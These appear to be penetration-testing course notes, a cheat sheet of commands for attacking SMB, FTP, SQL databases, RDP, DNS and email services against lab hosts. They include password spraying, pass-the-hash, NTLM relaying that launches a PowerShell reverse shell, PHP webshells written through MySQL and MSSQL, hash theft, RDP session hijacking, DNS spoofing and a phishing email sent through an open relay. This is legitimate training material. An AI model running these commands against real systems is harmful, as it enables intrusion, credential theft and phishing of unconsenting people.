smtp-user## Interacting with Common Services

### Windows

#### SMB
 On Windows GUI, we can press `[WINKEY] + [R]` to open the Run dialog box and type the file share location, e.g.: `\\192.168.220.129\Finance\`
 ![[Pasted image 20230308163759.png]]

#### Windows CMD - DIR
```cmd.exe
dir \\192.168.220.129\Finance\
```

#### Windows CMD - Net Use
```cmd.exe
net use n: \\192.168.220.129\Finance
```

#### Windows CMD - providing a username and password to authenticate to the share
```cmd.exe
net use n: \\192.168.220.129\Finance /user:plaintext Password123
```

#### Windows CMD - DIR - files the shared folder and its subdirectories contain
```cmd.exe
dir n: /a-d /s /b | find /c ":\"
```

#### Windows CMD - DIR to search for creds
```cmd.exe
dir n:\*cred* /s /b
```

#### Windows CMD - DIR to search for secret files
```cmd.exe
dir n:\*secret* /s /b
```

#### Windows CMD - Findstr
```cmd.exe
findstr /s /i cred n:\*.*
```

#### Windows PowerShell - Get-ChildItem (i.e., DIR)
```PowerShell
Get-ChildItem \\192.168.220.129\Finance\
```

#### Windows PowerShell - New-PSDrive (i.e., net use)
```PowerShell
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
```

#### Windows PowerShell - PSCredential Object to create a username and password
```PowerShell
$username = 'plaintext'
```

```PowerShell
$password = 'Password123'
```

```PowerShell
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
```

```PowerShell
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
```

```PowerShell
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
```

#### Windows PowerShell - use the property `-Include` to find specific items from the directory specified by the Path parameter
```PowerShell
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

#### Windows PowerShell - Select-String (i.e., findstr)
```PowerShell
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```

### Linux

#### Mount
```Shell
mkdir /mnt/Finance
```

```Shell
mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```

#### Mounting with a Credential File
```Shell
mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```

#### CredentialFile
```txt
username=plaintext
password=Password123
domain=.
```

*Note: We need to install `cifs-utils` to connect to an SMB share folder. To install it we can execute from the command line `sudo apt install cifs-utils`.*

#### Find
```Shell
find /mnt/Finance/ -name *cred*
```

#### Grep
```Shell
grep -rn /mnt/Finance/ -ie cred
```

### Email

#### Installing Evolution
```Shell
apt-get install evolution
```

#### Video - Connecting to IMAP and SMTP using Evolution
https://www.youtube.com/watch?v=xelO2CiaSVs

We can use the domain name or IP address of the mail server. If the server uses SMTPS or IMAPS, we'll need the appropriate encryption method (TLS on a dedicated port or STARTTLS after connecting). We can use the `Check for Supported Types` option under authentication to confirm if the server supports our selected method.

### MSSQL

#### Linux - SQSH
```Shell
sqsh -S 10.129.20.13 -U username -P Password123
```

#### Windows - SQLCMD
```cmd.exe
sqlcmd -S 10.129.20.13 -U username -P Password123
```

### MySQL

#### Linux - MySQL
```Shell
mysql -u username -pPassword123 -h 10.129.20.13
```

#### Windows - MySQL
```cmd.exe
mysql.exe -u username -pPassword123 -h 10.129.20.13
```

### SQL GUI Application

#### Install dbeaver
```Shell
dpkg -i dbeaver-<version>.deb
```

#### Run dbeaver
```Shell
dbeaver &
```

#### Connecting to MSSQL Using dbeaver
![[Pasted image 20230308170231.png]]

#### Connecting to MySQL Using dbeaver
![[Pasted image 20230308170252.png]]


## Attacking FTP

### Enumeration

#### Nmap
```Shell
nmap -sC -sV -p 21 192.168.2.142 
```

```Shell
nmap --script ftp-anon -sV -p 21 192.168.2.142 
```

### Misconfigurations

#### Anonymous Authentication
```Shell
ftp 192.168.2.142
```

#### Brute Forcing with Medusa
```Shell
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```

#### FTP Bounce Attack using Nmap
```Shell
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

### Vulnerabilities

#### [CoreFTP Exploitation](https://www.exploit-db.com/exploits/50652)
```Shell
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```


## Attacking SMB

### Enumeration

#### Scanning SMB with Nmap
```Shell
nmap 10.129.14.128 -sV -sC -p139,445
```

### Misconfigurations

#### Anonymous Authentication with smbclient
```Shell
smbclient -N -L //10.129.14.128
```

#### Anonymous Authentication - Enumeration with smbmap
```Shell
smbmap -H 10.129.14.128
```

#### Anonymous Authentication - Enumeration with smbmap - browsing directories
```Shell
smbmap -H 10.129.14.128 -r notes
```

#### Anonymous Authentication - READ and WRITE files to SMB Share
```Shell
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

```Shell
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

#### Remote Procedure Call (RPC)
```Shell
rpcclient -U'%' 10.10.110.17
```
[SANS Cheatsheet for RPC Client](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)

#### enum4linux-ng.py
```Shell
enum4linux-ng 10.10.11.45 -A -C
```

### Brute Forcing and Password Spraying

#### Password Spraying with CrackMapExec
```Shell
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'
```
*Note: By default CME will exit after a successful login is found. Using the ==`--continue-on-success`== flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list. *

### RCE

#### Logging in with impacket-psexec
```Shell
impacket-psexec administrator:'Password123!'@10.10.110.17
```

The same options apply to `impacket-smbexec` and `impacket-atexec`

#### Running commands using CrackMapExec
```Shell
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

*Note: If the `--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.*

#### Enumerating Logged-on Users with CrackMapExec
```Shell
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

#### Extracting Hashes from SAM Database using CrackMapExec
```Shell
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

#### Pass-the-Hash (PtH) with CrackMapExec
```Shell
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

### Forced Authentication Attacks

#### Intercepting LLMNR and NBT-NS traffic with Responder
```Shell
responder -I ens33
```

*Note: If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.*

#### Cracking NTLM hashes with Hashcat
```Shell
hashcat -m 5600 hash.txt rockyou.txt
```

#### If hash can't be cracked - relay the captured hash to another machine using impacket-ntlmrelayx. First, set SMB to `OFF` in the responder config file
```Shell
cat /etc/responder/Responder.conf | grep 'SMB ='
```

#### Execute impacket-ntlmrelayx 
```Shell
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```
Use the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.

#### Executing commands with impacket-ntlmrelayx
```Shell
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwA <..SNIP..>'
```
We can create a PowerShell reverse shell using https://www.revshells.com/, set our machine IP address, port, and the option Powershell #3 (Base64).

#### Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell
```Shell
nc -lnvp 9001
```

[SANS Institute SMB Access from Linux Cheatsheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)

### [SMBGhost Exploit](https://www.exploit-db.com/exploits/48537)

#### Running SMBGhost Exploit
```Shell
python smbghost.py -ip 192.168.142.131
```


## Attacking SQL Databases

### Enumeration

#### Banner Grabbing with Nmap
```Shell
nmap -Pn -sV -sC -p1433 10.10.10.125
```

### Protocol Specific Attacks

#### MySQL - Connecting to the SQL Server
```Shell
mysql -u julio -pPassword123 -h 10.129.20.13
```

#### MySQL - Connecting to the SQL Server using sqlcmd
```cmd.exe
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

*Note: When we authenticate to MSSQL using sqlcmd we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance. *

#### MSSQL - Connecting to the SQL Server using sqsh
```Shell
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```
We can use the parameter `-h` to disable headers and footers for a cleaner look.

#### MSSQL - Connecting to the SQL Server using mssqlclient.py
```Shell
mssqlclient.py -p 1433 julio@10.129.203.7 
```

#### MSSQL - Using sqlcmd to target a local account
```Shell
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

### SQL Syntax

#### Show Databases
```MySQL
SHOW DATABASES;
```

#### Show Databases from sqlcmd
```cmd.exe
SELECT name FROM master.dbo.sysdatabases
GO
```
Need to use `GO` after every query to execute the SQL syntax

#### Select Database
```MySQL
USE htbusers;
```

#### Select Database from sqlcmd
```cmd.exe
USE htbusers
GO
```

#### Show Tables
```MySQL
SHOW TABLES;
```

#### Show Tables from sqlcmd
```cmd.exe
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
GO
```

#### Select all Data from Table "users"
```MySQL
SELECT * FROM users;
```

#### Select all Data from Table "users" using sqlcmd
```cmd.exe
SELECT * FROM users
GO
```

### Executing Commands

#### Executing Commands using xp_cmdshell
```cmd.exe
xp_cmdshell 'whoami'
GO
```

#### Enabling xp_cmdshell (if not already enabled)
```cmd.exe
EXECUTE sp_configure 'show advanced options', 1
GO
```
To allow advanced options to be changed

```cmd.exe
RECONFIGURE
GO
```
To update the currently configured value for advanced options

```cmd.exe
EXECUTE sp_configure 'xp_cmdshell', 1
GO
```
To enable the feature

```cmd.exe
RECONFIGURE
GO
```
To update the currently configured value for this feature

*There are also additional functionalities that can be used like the xp_regwrite command that is used to elevate privileges by creating new entries in the Windows registry*

### Writing Local Files

#### MySQL - Write Local File
```MySQL
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

#### MySQL - Secure File Privileges
```MySQL
show variables like "secure_file_priv";
```
If the `secure_file_priv` variable is empty, this means we can read and write data using MySQL

#### MSSQL - Enable Ole Automation Procedures
```cmd.exe
sp_configure 'show advanced options', 1
GO
```

```cmd.exe
RECONFIGURE
GO
```

```cmd.exe
sp_configure 'Ole Automation Procedures', 1
GO
```

```cmd.exe
RECONFIGURE
GO
```

#### MSSQL - Create a File
```cmd.exe
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

### Read Local Files

#### Read Local Files in MSSQL
```cmd.exe
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

#### MySQL - Read Local Files in MySQL
```MySQL
select LOAD_FILE("/etc/passwd");
```

### Capture MSSQL Service Hash

#### XP_SUBDIRS Hash Stealing with Responder
```Shell
responder -I tun0
```
Must be started first, then followed by the next commands

Can also use `impacket-smbserver`

#### XP_SUBDIRS Hash Stealing with impacket
```Shell
impacket-smbserver share ./ -smb2support
```

#### XP_DIRTREE Hash Stealing
```cmd.exe
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO
```

#### XP_SUBDIRS Hash Stealing
```cmd.exe
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
```

### Impersonate Existing Users with MSSQL

#### Identify Users that can be impersonated
```cmd.exe
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```

#### Verifying our Current User and Role
```cmd.exe
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```
Per Example: As the returned value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user. 

#### Impersonating the SA User
```cmd.exe
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```
We can now execute any command as a sysadmin as the returned value `1` indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.

***Note: It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.*

### Communicate with Other Databases with MSSQL

#### Identify linked Servers in MSSQL
```cmd.exe
SELECT srvname, isremote FROM sysservers
GO
```
Note column `isremote`, where `1` means is a remote server, and `0` is a linked server

#### Using the EXECUTE statement can be used to send pass-through commands to linked servers
```cmd.exe
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO
```
We add our command between parenthesis and specify the linked server between square brackets ([ ]).

***Note: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (`;`).*


## Attacking RDP

### Enumeration

#### Enumerating RDP with Nmap
```Shell
nmap -Pn -p3389 192.168.2.143
```

### Misconfigurations

#### Installing Crowbar
```Shell
apt --fix-broken install
```

```Shell
apt install -y crowbar
```

#### Using Crowbar to perform a password spraying attack
```Shell
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

#### Hydra - RDP Password Spraying
```Shell
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

#### Logging in with rdesktop
```Shell
rdesktop -u admin -p password123 192.168.2.143
```

### Protocol Specific Attacks

#### RDP Session Hijacking - No Password and have SYSTEM level privileges
```cmd.exe
query user
```

```cmd.exe
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```
It works by specifying which SESSION ID (`4` for the `lewen` session in the example) we would like to connect to which session name (`rdp-tcp#13`, which is our current session)

#### RDP Session Hijacking - local administrator privileges
```cmd.exe
query user
```

```cmd.exe
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
```

```cmd.exe
net start sessionhijack
```
Once the service is started, a new terminal with the `lewen` user session will appear

### RDP Pass-the-Hash (PtH)

`Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:
![[Pasted image 20230309101531.png]]

#### Enabling Restricted Admin Mode
```cmd.exe
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

#### PtH over xfreerdp
```Shell
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

### Latest RDP Vulnerabilities
[CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708)


## Attacking DNS

### Enumeration

#### Enumerating DNS with Nmap
```Shell
nmap -p53 -Pn -sV -sC 10.10.110.213
```

#### DNS Zone Transfer with DIG
```Shell
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```

#### DNS Enumeration of root domain servers - Scan for Zone Transfers
```Shell
fierce --domain zonetransfer.me
```

### Subdomain Enumeration

#### Installing subfinder
```Shell
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
```

#### [DNSDumpster](https://dnsdumpster.com/)

#### Installing Sublist3r
```Shell
git clone https://github.com/aboul3la/Sublist3r.git
```

```Shell
pip install -r requirements.txt
```

#### Installing subfinder
```Shell
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
```

#### Subdomain Enumeration with subfinder
```Shell
subfinder -d inlanefreight.com -v
```

#### Subdomain Enumeration with Subbrute (located in Sublist3r directory)
```Shell
echo "ns1.inlanefreight.com" > ./resolvers.txt
```

```Shell
./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
```

#### Enumerate the CNAME records for subdomains found
```Shell
host support.inlanefreight.com
```

[can-i-take-over-xyz ](https://github.com/EdOverflow/can-i-take-over-xyz)

### Local DNS Cache Poisoning

#### Edit the `/etc/ettercap/etter.dns` file to 
```Shell
cat /etc/ettercap/etter.dns

inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```
Mmap the target domain name (e.g., `inlanefreight.com`) you want to spoof and the IP address (e.g., `192.168.225.110`) (the attack host IP) that you want to redirect a user to

#### Start the Ettercap tool and scan for live hosts within the network by navigating to `Hosts > Scan for Hosts`

#### Add the target IP address (e.g., 192.168.152.129) to `Target1` and add a default gateway IP (e.g., `192.168.152.2`) to `Target2`
![[Pasted image 20230309104736.png]]

##### Activate `dns_spoof` attack by navigating to `Plugins > Manage Plugins`
![[Pasted image 20230309104905.png]]

#### After a successful DNS spoof attack, if a victim user coming from the target machine `192.168.152.129` visits the `inlanefreight.com` domain on a web browser, they will be redirected to a Fake page that is hosted on IP address `192.168.225.110`
![[Pasted image 20230309104928.png]]

#### A ping coming from the target IP address `192.168.152.129` to inlanefreight.com should be resolved to `192.168.225.110` as well
```cmd.exe
ping inlanefreight.com
```


## Attacking Email Services

### Enumeration

#### Host - MX Records
```Shell
host -t MX hackthebox.eu
```

#### DIG - MX Records
```Shell
dig mx inlanefreight.com | grep "MX" | grep -v ";"
```

![[Pasted image 20230309105245.png]]

#### Enumerating mail services with the Nmap's default script
```Shell
nmap -Pn -sV -sC -p25,143,110,465,993,995 10.129.14.128
```

### Misconfigurations

#### Using the VRFY command to enumerate users on SMTP
```Shell
telnet 10.10.110.20 25
```

```SMTP
VRFY root

VRFY www-data

VRFY new-user
```

#### Using EXPN command to list all users on a distribution list
```Shell
telnet 10.10.110.20 25
```

```SMTP
EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

#### Using RCPT TO Command to identify the recipient of an email message
```Shell
telnet 10.10.110.20 25
```

```SMTP
MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```

#### Automating SMTP User Enumeration Process with `smtp-user-enum`
```Shell
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

#### Using the POP3 protocol to enumerate users
```Shell
telnet 10.10.110.20 110
```

```POP3
USER julio

-ERR


USER john

+OK
```

#### Password Spraying POP3 with Hydra
```Shell
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

### Cloud Enumeration

#### Using O365 Spray to validate if our target domain is using Office 365
```Shell
python3 o365spray.py --validate --domain msplaintext.xyz
```

#### Identifying usernames with O365 Spray
```Shell
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz 
```

#### Password spraying using O365 Spray
```Shell
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

#### Custom Tools for Password Spraying if Hydra is blocked
- o365spray.py (Microsoft Office 365)
- [MailSniper.ps1](https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1) (Microsoft Office 365)
- [credking.py](https://raw.githubusercontent.com/ustayready/CredKing/master/credking.py) (Gmail)

### Protocol Specific Attacks

#### Open Relay Attack - Identification with Nmap
```Shell
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

#### Use any mail client to connect to the mail server and send our email
```Shell
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

### Latest Vulns

[CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247)

#### Shodan Search
![[Pasted image 20230309111552.png]]
